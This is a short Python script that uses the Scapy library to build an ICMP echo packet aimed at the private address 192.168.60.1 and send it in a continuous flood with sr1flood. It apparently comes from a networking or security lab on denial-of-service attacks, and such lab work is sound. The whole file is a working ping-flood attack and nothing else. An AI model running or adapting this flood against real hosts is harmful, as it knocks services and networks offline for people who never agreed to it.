from scapy.all import *

ip=IP(dst="192.168.60.1")
icmp=ICMP(id=6000)
pkt=(ip/icmp)
#sr1flood(pkt)
#send(pkt)
sr1flood(pkt)
